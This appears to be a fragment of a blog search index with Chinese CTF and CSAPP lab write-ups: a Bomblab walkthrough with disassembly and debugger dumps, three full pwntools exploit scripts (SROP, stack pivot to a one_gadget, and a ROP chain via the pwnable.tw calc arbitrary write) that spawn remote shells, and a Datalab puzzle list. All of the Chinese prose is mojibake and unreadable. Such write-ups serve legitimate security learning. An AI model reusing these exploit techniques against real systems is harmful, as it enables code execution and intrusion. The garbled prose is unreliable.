\u003cphase_6+0x8f\u003e ;0x401183 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 \u003cphase_6+0x82\u003e ;0x401176 esièµ‹å€¼ä¸º0ï¼Œrsp+rsiæŒ‡å‘çš„å€¼ï¼Œå³æˆ‘ä»¬çš„æ•°ç»„å…ƒç´ ï¼Œæ”¾å…¥ecxï¼Œå¹¶ä¸1è¿›è¡Œæ¯”è¾ƒã€‚å°äºç­‰äº1åˆ™è·³è½¬å›å»ï¼Œå°†0x6032d0å¤„çš„å†…å®¹æ”¾å…¥rsp+rsi*2+0x20çš„ä½ç½®ã€‚å¦åˆ™ï¼Œeaxèµ‹å€¼ä¸º1ï¼Œ0x6032d0æ”¾å…¥edxï¼Œè·³è½¬åˆ°ï¼Œ0x6032d0+8æ”¾å…¥rdxï¼Œeax+1å¹¶äºå½“å‰æ•°ç»„å€¼è¿›è¡Œæ¯”è¾ƒï¼Œä¸ç›¸ç­‰å°±eax++ï¼Œ0x6032d0+8å†åŠ 8ã€‚ç›´åˆ°ä¸å½“å‰æ•°ç»„å…ƒç´ ç›¸ç­‰ï¼Œå°†åç§»åçš„åœ°å€æŒ‡å‘çš„å†…å®¹æ”¾å…¥rsp+rsi*2+0x20ã€‚ç„¶åç´¢å¼•å€¼rsi+4å¹¶ä¸0x18æ¯”è¾ƒï¼Œåˆ¤æ–­æ˜¯å¦åˆ°äº†æ•°ç»„å°¾éƒ¨ã€‚å¦åˆ™å°†ä¸‹ä¸€ä¸ªå…ƒç´ æ”¾å…¥ecxï¼Œå¹¶ä¸1æ¯”è¾ƒã€‚ è¿™é‡Œä¸å¤ªæ¸…æ™°æˆ‘ä»¬çœ‹ä¸€ä¸‹0x6032d0æœ‰ä»€ä¹ˆï¼š pwndbg\u003e x/24x 0x6032d0 0x6032d0 \u003cnode1\u003e: 0x0000014c 0x00000001 0x006032e0 0x00000000 0x6032e0 \u003cnode2\u003e: 0x000000a8 0x00000002 0x006032f0 0x00000000 0x6032f0 \u003cnode3\u003e: 0x0000039c 0x00000003 0x00603300 0x00000000 0x603300 \u003cnode4\u003e: 0x000002b3 0x00000004 0x00603310 0x00000000 0x603310 \u003cnode5\u003e: 0x000001dd 0x00000005 0x00603320 0x00000000 0x603320 \u003cnode6\u003e: 0x000001bb 0x00000006 0x00000000 0x00000000 å¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„ç»“æ„å¦‚ä¸‹ï¼š struct node{ int value; int index; node *next; } æˆ‘ä»¬åˆšåˆšåšçš„å°±æ˜¯å°†èŠ‚ç‚¹åœ°å€æ”¾å…¥äº†æ ˆä¸­ã€‚ ç»§ç»­åˆ†æä¸‹ä¸€æ®µï¼š 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 \u003cphase_6+0xde\u003e ;0x4011d2 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd \u003cphase_6+0xc9\u003e ;0x4011bd 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 rbxåˆ†åˆ«æŒ‡å‘æ•°ç»„é¦–å€ï¼ŒraxæŒ‡å‘ç¬¬äºŒä¸ªèŠ‚ç‚¹ï¼ŒrsiæŒ‡å‘","date":"2021-01-31","objectID":"/csapp-bomblab/:6:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#phase_6"},{"categories":["Pwning"],"content":"secret_phaseè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå½©è›‹ï¼å…ˆæ¥æ‰¾ä¸€ä¸‹è¿›å…¥æ¡ä»¶ï¼š 00000000004015c4 \u003cphase_defused\u003e: 4015c4: 48 83 ec 78 sub $0x78,%rsp 4015c8: 64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf: 00 00 4015d1: 48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6: 31 c0 xor %eax,%eax 4015d8: 83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u003cnum_input_strings\u003e 4015df: 75 5e jne 40163f \u003cphase_defused+0x7b\u003e 4015e1: 4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6: 48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb: 48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0: be 19 26 40 00 mov $0x402619,%esi 4015f5: bf 70 38 60 00 mov $0x603870,%edi 4015fa: e8 f1 f5 ff ff callq 400bf0 \u003c__isoc99_sscanf@plt\u003e 4015ff: 83 f8 03 cmp $0x3,%eax 401602: 75 31 jne 401635 \u003cphase_defused+0x71\u003e 401604: be 22 26 40 00 mov $0x402622,%esi 401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi 40160e: e8 25 fd ff ff callq 401338 \u003cstrings_not_equal\u003e 401613: 85 c0 test %eax,%eax 401615: 75 1e jne 401635 \u003cphase_defused+0x71\u003e 401617: bf f8 24 40 00 mov $0x4024f8,%edi 40161c: e8 ef f4 ff ff callq 400b10 \u003cputs@plt\u003e 401621: bf 20 25 40 00 mov $0x402520,%edi 401626: e8 e5 f4 ff ff callq 400b10 \u003cputs@plt\u003e 40162b: b8 00 00 00 00 mov $0x0,%eax 401630: e8 0d fc ff ff callq 401242 \u003csecret_phase\u003e 401635: bf 58 25 40 00 mov $0x402558,%edi 40163a: e8 d1 f4 ff ff callq 400b10 \u003cputs@plt\u003e 40163f: 48 8b 44 24 68 mov 0x68(%rsp),%rax 401644: 64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b: 00 00 40164d: 74 05 je 401654 \u003cphase_defused+0x90\u003e 40164f: e8 dc f4 ff ff callq 400b30 \u003c__stack_chk_fail@plt\u003e 401654: 48 83 c4 78 add $0x78,%rsp 401658: c3 retq è¦æƒ³è¿›å…¥å¿…é¡»æ»¡è¶³ï¼Œ0x603759 å¤„çš„å€¼ä¸º6ï¼Œè°ƒè¯•å‘ç°ï¼Œæˆ‘ä»¬æ¯é—¯è¿‡ä¸€å…³ï¼Œè¿™é‡Œçš„å€¼éƒ½ä¼š+1ã€‚æ‰€ä»¥å¿…é¡»é€šè¿‡å‰å…­å…³æ‰å¯ä»¥ã€‚ç„¶åä¼ å…¥äº†ï¼Œäº”ä¸ªå‚æ•°ã€‚æˆ‘ä»¬çœ‹çœ‹$0x402619å’Œ0x603870å¤„æ˜¯ä»€ä¹ˆï¼š pwndbg\u003e x /2s 0x402619 0x402619: \"%d %d %s\" 0x402622: \"DrEvil\" pwndbg\u003e x 0x603870 0x603870 \u003cinput_strings+240\u003e: \"7 0\" æ˜¯æˆ‘ä»¬ç¬¬å››å…³çš„ç­”æ¡ˆï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªæ¡ä»¶å°±æ˜¯åœ¨ç¬¬å››å…³ä¸­ï¼Œä¹‹ååˆè°ƒç”¨äº†strings_not_equalå°†æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°ä¸DrEvilè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸ç­‰å°±å¯ä»¥è¿›å…¥ã€‚æ‰€ä»¥ï¼Œä¸ºäº†è¿›å…¥æˆ‘ä»¬è¦åœ¨ç¬¬å››å…³ç­”æ¡ˆåŸºç¡€ä¸Šæ·»åŠ  DrEvilï¼Œåˆ«å¿˜äº†ç©ºæ ¼ã€‚ 0000000000401242 \u003csecret_phase\u003e: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e \u003cread_line\u003e 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 \u003cstrtol@plt\u003e 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c \u003csecret_phase+0x2a\u003e 401267: e8 ce 01 00 00 callq 40143a \u003cexplode_bomb\u003e 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 \u003cfun7\u003e åœ¨secret_phaseä¸­ï¼Œé¦–å…ˆä¼šè°ƒç”¨ä¸€ä¸ªstrtolå‡½æ•°å°†è¾“å…¥çš„å†…å®¹è½¬æ¢æˆ10è¿›åˆ¶æ•°ï¼Œè¯´æ˜æˆ‘ä»¬çš„è¾“å…¥è¦æ˜¯ä¸€ä¸ªæ•°å­—ã€‚ç„¶åå°†è¿”å›å€¼ä¸999è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœå¤§äº999å°±ä¼šçˆ†ç‚¸ã€‚ç„¶åå°†è¾“å…¥çš„æ•°å­—ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ï¼Œ0x6030f0ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°è°ƒç”¨fun7ã€‚ æŸ¥çœ‹0x6030f0ï¼š pwndbg\u003e x /120w 0x6030f0 0x6030f0 \u003cn1\u003e: 0x00000024 0x00000000 0x00603110 0x00000000 0x603100 \u003cn1+16\u003e: 0x00603130 0x00000000 0x00000000 0x00000000 0x603110 \u003cn21\u003e: 0x00000008 0x00000000 0x00603190 0x00000000 0x603120 \u003cn21+16\u003e: 0x00603150 0x00000000 0x00000000 0x00000000 0x603130 \u003cn22\u003e: 0x00000032 0x00000000 0x00603170 0x00000000 0x603140 \u003cn22+16\u003e: 0x006031b0 0x00000000 0x00000000 0x00000000 0x603150 \u003cn32\u003e: 0x00000016 0x00000000 0x00603270 0x00000000 0x603160 \u003cn32+16\u003e: 0x00603230 0x00000000 0x00000000 0x00000000 0x603170 \u003cn33\u003e: 0x0000002d 0x00000000 0x006031d0 0x00000000 0x603180 \u003cn33+16\u003e: 0x00603290 0x00000000 0x00000000 0x00000000 0x603190 \u003cn31\u003e: 0x00000006 0x00000000 0x006031f0 0x00000000 0x6031a0 \u003cn31+16\u003e: 0x00603250 0x00000000 0x00000000 0x00000000 0x6031b0 \u003cn34\u003e: 0x0000006b 0x00000000 0x00603210 0x00000000 0x6031c0 \u003cn34+16\u003e: 0x006032b0 0x00000000 0x00000000 0x00000000 0x6031d0 \u003cn45\u003e: 0x00000028 0x00000000 0x00000000 0x00000000 0x6031e0 \u003cn45+16\u003e: 0x00000000 0x00000000 0x00000000 0x00000000 0x6031f0 \u003cn41\u003e: 0x00000001 0x00000000 0x00000000 0x00000000 0x603200 \u003cn41+16\u003e: 0x00000000 0x00000000 0x00000000 0x00000000 0x603210 \u003cn47\u003e: 0x00000063 0x00000000 0x00000000 0x00000000 0x603220 \u003cn47+16\u003e: 0x00000000 0x00000000 0x00000000 0x00000000 0x603230 \u003cn44\u003e: 0x00000023 0x00000000 0x00000000 0x00000000 0x603240 \u003cn44+16\u003e: 0x00000000 0x00000000 0x00000000 0x00000000 0x603250 \u003cn42\u003e: 0x00000007 0x00000000 0x00000","date":"2021-01-31","objectID":"/csapp-bomblab/:7:0","series":null,"tags":["Pwn"],"title":"CSAPP Bomblab","uri":"/csapp-bomblab/#secret_phase"},{"categories":["Writeups"],"content":"Challenges_100-Week_4 Challenges Tricks 0x41414141 CTF-moving-signals SROP 0x41414141 CTF-external stack pivoting pwnable.tw-calc é€»è¾‘æ¼æ´+ROP ","date":"2021-01-28","objectID":"/challenges-100-week-4/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#challenges_100-week_4"},{"categories":["Writeups"],"content":"moving-signals","date":"2021-01-28","objectID":"/challenges-100-week-4/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#moving-signals"},{"categories":["Writeups"],"content":"ida mov rdi, 0 ; Alternative name is '_start' ; __start mov rsi, rsp sub rsi, 8 mov rdx, 1F4h syscall ; LINUX - sys_read retn endp pop rax retn è§è¿‡æœ€çŸ­çš„ç¨‹åºäº†â€¦.ç®€å•åˆ†æå‘ç°åªèƒ½æ§åˆ¶raxï¼Œå³sycallè°ƒç”¨çš„å‡½æ•°ã€‚ä¸ºäº†èƒ½æ§åˆ¶æ›´å¤šçš„å¯„å­˜å™¨ï¼Œæƒ³åˆ°ä½¿ç”¨SROPã€‚ ","date":"2021-01-28","objectID":"/challenges-100-week-4/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./moving-signals' #gdb.attach(p) if local: p=process(binary) else: p=remote('161.97.176.150',2525) elf = ELF(binary,checksec=False) start=0x041000 pop_rax=0x041018 syscall=0x041015 bss=0x041500 shellcode=asm(shellcraft.sh()) #gdb.attach(p) frame = SigreturnFrame() frame.rsp=bss frame.rip=syscall frame.rax=constants.SYS_read frame.rdi=0 frame.rsi=bss frame.rdx=0x50 payload='a'*8+p64(pop_rax)+p64(0xf)+p64(syscall)+str(frame) p.send(payload) payload=p64(bss+8)+shellcode p.sendline(payload) p.interactive() ","date":"2021-01-28","objectID":"/challenges-100-week-4/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#exp"},{"categories":["Writeups"],"content":"external","date":"2021-01-28","objectID":"/challenges-100-week-4/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#external"},{"categories":["Writeups"],"content":"ida int __cdecl main(int argc, const char **argv, const char **envp) { char buf[80]; // [rsp+0h] [rbp-50h] BYREF puts(\"ROP me ;)\"); printf(\"\u003e \"); read(0, buf, 0xF0uLL); clear_got(); return 0; } ä¸»å‡½æ•°æŠŠgotè¡¨ç»™æ¸…é™¤äº†ï¼Œç€å®å“åˆ°æˆ‘äº†ã€‚ä¸è¿‡æœ‰ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚ .text:000000000040127C write_syscall proc near ; CODE XREF: timeout+22â†‘p .text:000000000040127C ; __unwind { .text:000000000040127C mov rax, 1 .text:0000000000401283 syscall ä¸»å‡½æ•°çš„æ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼š .text:0000000000401224 ; int __cdecl main(int argc, const char **argv, const char **envp) .text:0000000000401224 public main .text:0000000000401224 main proc near ; DATA XREF: _start+21â†‘o .text:0000000000401224 .text:0000000000401224 buf = byte ptr -50h .text:0000000000401224 .text:0000000000401224 ; __unwind { .text:0000000000401224 push rbp .text:0000000000401225 mov rbp, rsp .text:0000000000401228 sub rsp, 50h .text:000000000040122C lea rdi, s ; \"ROP me ;)\" .text:0000000000401233 call _puts .text:0000000000401238 lea rdi, format ; \"\u003e \" .text:000000000040123F mov eax, 0 .text:0000000000401244 call _printf .text:0000000000401249 lea rax, [rbp+buf] .text:000000000040124D mov edx, 0F0h ; nbytes .text:0000000000401252 mov rsi, rax ; buf .text:0000000000401255 mov edi, 0 ; fd .text:000000000040125A call _read .text:000000000040125F mov eax, 0 .text:0000000000401264 call clear_got .text:0000000000401269 mov eax, 0 .text:000000000040126E leave .text:000000000040126F retn .text:000000000040126F ; } // starts at 401224 .text:000000000040126F main endp è™½ç„¶æ²¡æœ‰äº†gotè¡¨ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡bssæ®µçš„stdinè¿›è¡Œleakã€‚è¦åšçš„æ“ä½œæœ‰ï¼š æ§åˆ¶writeå‚æ•°å°†stdinåœ°å€leak æ§åˆ¶readå‚æ•°è¯»å–one_gadgetåœ°å€å¹¶å°†å…¶å†™å…¥åˆ°å·²çŸ¥åœ°å€ æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œåˆ°one_gadget é€šè¿‡writeè¿›è¡Œleakåï¼Œå¦‚æœæƒ³è¦å†æ¬¡æ§åˆ¶raxé‚£ä¹ˆå°±ä¼šè¿›è¡Œleave retï¼Œè¿›è¡Œäº†æ ˆè¿ç§»ã€‚è¿™æ˜¯æˆ‘ä»¬æ— æ³•æ§åˆ¶çš„ï¼Œå¹¶ä¸”æˆ‘ä»¬æ²¡æœ‰åœ¨fake stackä¸­å¸ƒç½®æ ˆç»“æ„ã€‚æ‰€ä»¥æˆ‘ä»¬å…ˆè¿›è¡Œreadï¼Œæå‰å¸ƒç½®å¥½æ ˆçš„ç»“æ„ã€‚ç„¶åè°ƒç”¨writeè¿›è¡Œleakã€‚ä¹‹åå› ä¸ºè¿˜è¦æ¥å—one_gadgetçš„åœ°å€ï¼Œå¹¶å°†å…¶å†™å…¥å¯æ§åœ°å€ï¼ŒåŒæ—¶æˆ‘ä»¬è¦è¿›è¡Œæ ˆçš„è¿ç§»ã€‚æ‰€ä»¥å›åˆ°0x40125fçš„ä½ç½®æ­£å¥½å¸®åŠ©æˆ‘ä»¬å®Œæˆäº†è¿™ä¸ªæ“ä½œã€‚ é‚£ä¹ˆå¸ƒç½®çš„æ ˆç»“æ„æ˜¯ä»€ä¹ˆæ ·çš„å‘¢ï¼Ÿå½“ç¨‹åºæ‰§è¡Œåˆ°fake stackä¸­æ—¶ï¼Œå·²ç»å®Œæˆäº†ï¼Œleakä¸æ ˆè¿ç§»ï¼Œraxä¹Ÿè¢«ç½®ä¸º0ï¼Œè¿™æ—¶æˆ‘ä»¬åªè¦è°ƒç”¨readï¼Œå¹¶å°†one_gadgetå†™åˆ°readè¿”å›ä¹‹åå³å¯ã€‚ ","date":"2021-01-28","objectID":"/challenges-100-week-4/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./external' #gdb.attach(p) if local: p=process(binary) else: p=remote('161.97.176.150',9999) elf = ELF(binary,checksec=False) offset = 0x50 write_call=0x040127C pop_rdi=0x4012f3 pop_rsi=0x4012f1 stdin=0x0404070 fake_stack=0x404078+0x100 syscall=0x401283 leave_ret=0x04011d8 mov_eax=0x00401269 p.recv() payload='a'*offset+p64(fake_stack) payload+=p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_stack)+p64(0)+p64(syscall)#read(0,fake_stack,0x38) payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(stdin)+p64(0)+p64(write_call)+p64(mov_eax)#write(1,stdin,0x38) p.send(payload) payload='a'*8+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_stack+56)+p64(0)+p64(syscall)#read(0,fake_stack+56,0x38) p.send(payload) sleep(1) stdin_addr= u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) print hex(stdin_addr) libc=ELF('./libc-2.28.so') libcbase=stdin_addr-libc.sym[\"_IO_2_1_stdin_\"] one=libcbase+0x448a3 #0x448a3 0xe5456 p.send(p64(one)) p.interactive() ","date":"2021-01-28","objectID":"/challenges-100-week-4/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#exp-1"},{"categories":["Writeups"],"content":"calc","date":"2021-01-28","objectID":"/challenges-100-week-4/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#calc"},{"categories":["Writeups"],"content":"checksec [*] '/home/niebelungen/Desktop/pwnable.tw/calc/calc' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ","date":"2021-01-28","objectID":"/challenges-100-week-4/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#checksec"},{"categories":["Writeups"],"content":"idamain: int __cdecl main(int argc, const char **argv, const char **envp) { ssignal(14, timeout); alarm(60); puts(\"=== Welcome to SECPROG calculator ===\"); fflush(stdout); calc(); return puts(\"Merry Christmas!\"); } calc: unsigned int calc() { int v1[101]; // [esp+18h] [ebp-5A0h] BYREF char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF unsigned int v3; // [esp+5ACh] [ebp-Ch] v3 = __readgsdword(0x14u); while ( 1 ) { bzero(s, 0x400u); if ( !get_expr(s, 1024) ) break; init_pool(v1); if ( parse_expr((int)s, v1) ) { printf(\"%d\\n\", v1[v1[0]]); fflush(stdout); } } return __readgsdword(0x14u) ^ v3; } get_expr: int __cdecl get_expr(int a1, int a2) { int v2; // eax char v4; // [esp+1Bh] [ebp-Dh] BYREF int v5; // [esp+1Ch] [ebp-Ch] v5 = 0; while ( v5 \u003c a2 \u0026\u0026 read(0, \u0026v4, 1) != -1 \u0026\u0026 v4 != 10 ) { if ( v4 == 43 || v4 == 45 || v4 == 42 || v4 == 47 || v4 == 37 || v4 \u003e 47 \u0026\u0026 v4 \u003c= 57 ) { v2 = v5++; *(_BYTE *)(a1 + v2) = v4; } } *(_BYTE *)(v5 + a1) = 0; return v5; } parse_expr: int __cdecl parse_expr(int a1, _DWORD *num) { int v3; // eax int v4; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int v6; // [esp+28h] [ebp-80h] int v7; // [esp+2Ch] [ebp-7Ch] char *s1; // [esp+30h] [ebp-78h] int left_num; // [esp+34h] [ebp-74h] char s[100]; // [esp+38h] [ebp-70h] BYREF unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v4 = a1; v6 = 0; bzero(s, 0x64u); for ( i = 0; ; ++i ) { if ( (unsigned int)(*(char *)(i + a1) - 48) \u003e 9 ) { v7 = i + a1 - v4; s1 = (char *)malloc(v7 + 1); memcpy(s1, v4, v7); s1[v7] = 0; if ( !strcmp(s1, \"0\") ) { puts(\"prevent division by zero\"); fflush(stdout); return 0; } left_num = atoi(s1); if ( left_num \u003e 0 ) { v3 = (*num)++; num[v3 + 1] = left_num; } if ( *(_BYTE *)(i + a1) \u0026\u0026 (unsigned int)(*(char *)(i + 1 + a1) - 48) \u003e 9 ) { puts(\"expression error!\"); fflush(stdout); return 0; } v4 = i + 1 + a1; if ( s[v6] ) // åˆ¤æ–­å½“å‰æ“ä½œç¬¦æ˜¯å¦ä¸ºç¬¬ä¸€ä¸ªæ“ä½œç¬¦ // æ˜¯åˆ™ç»§ç»­éå†å¯»æ‰¾ä¸‹ä¸€ä¸ªæ“ä½œç¬¦ // å¦åˆ™å¯¹å‰é¢çš„å¼å­è¿›è¡Œè®¡ç®— { switch ( *(_BYTE *)(i + a1) ) { case '%': case '*': case '/': if ( s[v6] != 43 \u0026\u0026 s[v6] != 45 ) goto LABEL_14; s[++v6] = *(_BYTE *)(i + a1); break; case '+': case '-': LABEL_14: eval(num, s[v6]); s[v6] = *(_BYTE *)(i + a1); break; default: eval(num, s[v6--]); break; } } else { s[v6] = *(_BYTE *)(i + a1); } if ( !*(_BYTE *)(i + a1) ) break; } } while ( v6 \u003e= 0 ) eval(num, s[v6--]); return 1; } eval: _DWORD *__cdecl eval(_DWORD *a1, char a2) { _DWORD *result; // eax if ( a2 == '+' ) { a1[*a1 - 1] += a1[*a1]; } else if ( a2 \u003e '+' ) { if ( a2 == '-' ) { a1[*a1 - 1] -= a1[*a1]; } else if ( a2 == '/' ) { a1[*a1 - 1] /= (int)a1[*a1]; } } else if ( a2 == '*' ) { a1[*a1 - 1] *= a1[*a1]; } result = a1; --*a1; return result; } get_exprç”¨æ¥è·å–è¾“å…¥çš„è¡¨è¾¾å¼ï¼Œparse_exprç”¨æ¥è¿›è¡Œå¤„ç†å¼å­ã€‚è®¡ç®—å™¨å¤§è‡´çš„æ€è·¯å°±æ˜¯numæ•°ç»„åªæ¥å—æ“ä½œæ•°ï¼Œå¦‚æœæ¥æ”¶çš„æ“ä½œç¬¦ä¸æ˜¯ç¬¬ä¸€ä¸ªæ“ä½œç¬¦å°±è¿›è¡Œè®¡ç®—ã€‚é‚£ä¹ˆå°±æœ‰è¿™æ ·ä¸€ä¸ªæ¼æ´ï¼š è¾“å…¥ï¼š+300 è¿™æ—¶æœ‰ä¸€ä¸ªæ“ä½œæ•° *a1=1 *a2='+' num[1]=300 num[1-1]+=num[1] ===\u003e num[0]=301 æœ€å--*a1 ===\u003e num[0]=300 é‚£ä¹ˆv1[v1[0]] ===\u003e v1[300] è‹¥è¾“å…¥ï¼š+300-100 +300çš„è®¡ç®—åŒä¸Š num[0]-=num[1] ===\u003e num[300]=num[300]-100 å®ç°äº†ä»»æ„åœ°å€è¯»å†™çš„,è°ƒè¯•å‘ç°361å¤„å¯¹åº”äº†è¿”å›åœ°å€ é‚£ä¹ˆæˆ‘ä»¬è¿™æ ·æ„é€ æ ˆç»“æ„ï¼š 361===\u003e |pop_eax_addr | 362 |0xb | 363 |pop_edx_addr | 364 |0 | 365 |pop_ecx_ebx | 366 |0 | 367 |\u0026('/bin/sh') | 368 |int_0x80_addr | 369 |'/bin' | 370 |'/sh\\x00' | è®¡ç®—æ ˆçš„åœ°å€ï¼š .text:08049453 mov ebp, esp .text:08049455 and esp, 0FFFFFFF0h .text:08049458 sub esp, 10h mainå‡½æ•°ä¸­ï¼Œå¯çŸ¥ï¼šmain_stack_size=ebp\u00260xFFFFFFF0-0x10 åˆ™è¿”å›åœ°å€åˆ°ebpä¸ºmainå‡½æ•°æ ˆï¼Œé•¿åº¦ä¸ºï¼šindex=main_stack_size/4+1 é‚£ä¹ˆå­—ç¬¦ä¸²çš„åœ°å€ä¸ºï¼šbin_sh=ebp-(index-8)*4ï¼Œæ³¨æ„æ ˆçš„å¢é•¿æ–¹å‘ã€‚ ","date":"2021-01-28","objectID":"/challenges-100-week-4/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{:#x}'.format(name,addr)) #context.log_level=\"DEBUG\" #context.arch=\"amd64\" local=0 binary='./calc' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10100) elf = ELF(binary,checksec=False) ret_addr=0x08049499 pop_eax =0x0805c34b #361 362:11 pop_edx =0x080701aa #363 364:0 pop_ecx =0x080701d1 #365 366:0 367:\u0026(/bin/sh) int_0x80=0x08049a21 #368 369:'/bin/sh' gadget=[0x0805c34b,11,0x080701aa,0,0x080701d1,0,0xffffffff,0x08049a21,0x6e69622f,0x0068732f] p.recv() for i in range(0,6): p.sendline('+'+str(361+i)) val=int(p.recv()) offset=int(gadget[i])-val if offset\u003e0: p.sendline('+'+str(361+i)+'+'+str(offset)) else: p.sendline('+'+str(361+i)+str(offset)) result=int(p.recv()) log.success(str(361+i)+'==\u003e'+hex(result)) p.sendline('+360') stackbase=int(p.recv()) stacksize=stackbase+0x100000000-((stackbase+0x100000000) \u0026 0xFFFFFFF0-16) bin_sh=stackbase+(8-(24/4+1))*4 p.sendline('+367') val_367=int(p.recv()) offset=bin_sh-val_367 if offset\u003e0: p.sendline('+'+str(367)+'+'+str(offset)) else: p.sendline('+'+str(367)+str(offset)) result=int(p.recv()) log.success(str(367)+'==\u003e'+hex(result)) for i in range(7,10): p.sendline('+'+str(361+i)) val=int(p.recv()) offset=int(gadget[i])-val if offset\u003e0: p.sendline('+'+str(361+i)+'+'+str(offset)) else: p.sendline('+'+str(361+i)+str(offset)) result=int(p.recv()) log.success(str(361+i)+'==\u003e'+hex(result)) #gdb.attach(p) p.sendline('Niebelungen') p.interactive() ","date":"2021-01-28","objectID":"/challenges-100-week-4/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 4","uri":"/challenges-100-week-4/#exp-2"},{"categories":["Pwning"],"content":"CSAPP-Datalablabsç³»åˆ—çš„ç¬¬ä¸€ä¸ªlabï¼Œä¸»è¦è€ƒæŸ¥ä¹¦ä¸­ç¬¬äºŒç« çš„çŸ¥è¯†ã€‚æŒºçƒ§è„‘çš„ã€‚ã€‚ã€‚ ","date":"2021-01-25","objectID":"/csapp-datalab/:0:0","series":null,"tags":["Pwn"],"title":"CSAPP Datalab","uri":"/csapp-datalab/#csapp-datalab"},{"categories":["Pwning"],"content":"List Name Description Rating Max ops bitCor (x, y) x^y using only ~ and \u0026 1 14 tmin() è¿”å›æœ€å°è¡¥ç  1 4 isTmax(x) åˆ¤æ–­æ˜¯å¦ä¸ºè¡¥ç æœ€å¤§å€¼ 1 10 allOddBits(x) åˆ¤æ–­è¡¥ç æ‰€æœ‰å¥‡æ•°ä½æ˜¯å¦éƒ½æ˜¯1 2 12 negate(x) ä¸ä½¿ç”¨-å®ç°-x 3 5 isAsciDigit(x) åˆ¤æ–­xæ˜¯å¦æ˜¯ASCIIç  3 15 conditional å®ç°x ? y : z 3 16 isLessOrEqual(x, y) x\u003c=y 3 24 logicalNeg(x)) è®¡ç®—!xè€Œä¸ç”¨! 3 12 howManyBits(x) è®¡ç®—è¡¨è¾¾xæ‰€éœ€çš„æœ€å°‘ä½æ•° 4 90 float_twice(uf) è®¡ç®—2.0*uf 4 30 float_i2f(uf) è®¡ç®—(float) f 4 30 float_f2i(uf) è®¡ç®—(int) f 4 30 